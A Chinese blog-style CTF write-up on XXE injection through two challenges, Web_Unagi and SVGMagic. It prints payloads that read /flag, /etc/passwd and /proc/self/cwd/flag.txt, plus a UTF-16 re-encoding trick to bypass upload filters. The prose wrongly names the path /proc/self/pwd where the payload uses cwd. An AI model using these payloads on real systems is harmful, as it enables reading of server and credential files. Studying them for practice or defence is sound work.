XML相关补充知识

emm... 1888 words in the article | you are the th friend who reading now

最近做了两道关于xml注入的问题，发现了一些新的知识和技巧，在这里统一汇总一下。

[CSAWQual 2019]Web_Unagi

这道题是让上传一个xml文件，查看上传例子后可以知道是些xml注入题目，注入方法和之前做到过的题目一模一样，但是写入文件直接上传是行不通的要转成utf-16的编码来绕过，这道题给出了一个新的xml绕过方法，下面是转成utf-16的命令： 

iconv -f utf8 -t utf-16 1.xml>2.xml

然后上传即可得到flag。

附上注入的xml文件： 

<?xml version='1.0'?>
<!DOCTYPE users [
<!ENTITY xxe SYSTEM "file:///flag" >]>
<users>
<user>
    <username>bob</username>
    <password>passwd2</password>
    <name> Bob</name>
    <email>bob@fakesite.com</email>  
    <group>CSAW2019</group>
    <intro>&xxe;</intro>
</user>
</users>

[BSidesCF 2019]SVGMagic

这道题也是xml注入，只不过也需要转换。转换之前要先介绍一下svg是什么： 

SVG(Scalable Vector Graphics)是一种基于XML的二维矢量图格式，和我们平常用的jpg/png等图片格式所不同的是SVG图像在放大或改变尺寸的情况下其图形质量不会有所损失，并且我们可以使用任何的文本编辑器打开SVG图片并且编辑它，目前主流的浏览器都已经支持SVG图片的渲染。

可以知道，svg和xml还是有很大关系的，这也就解释了为什么svg也可以造成xml注入，除此之外svg还会造成xss，这个以后介绍，我们先来介绍svg造成的xxe。

前面说了SVG是基于XML的矢量图，因此可以支持Entity(实体)功能，因此可以用来XXE。而我们需要做的也就是在之前的xml文件上进行修改。

读取/etc/passwd如下： 

<?xml version="1.0" encoding="UTF-8"?> 
<!DOCTYPE note [ 
<!ENTITY file SYSTEM "file:///etc/passwd" > ]> 
<svg height="100" width="1000"> 
<text x="10" y="20">&file;</text> 
</svg>

把这段代码保存为svg格式即可，如果回显不完全，那么我们可以通过调整宽度来回显完全。

最后payload如下： 

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE note [
<!ENTITY file SYSTEM "file:///proc/self/cwd/flag.txt" >]>
<svg height="100" width="1000"><text x="10" y="20">&file;</text>
</svg>

这里/proc/self/pwd/代表的是当前路径，可以构造/proc/self/pwd/flag.txt读取文件。因为flag路径未给出。

小结

总的来说虽然xml注入问题碰到的并不多，但是相关题目知识点还是很多的，要多做积累。
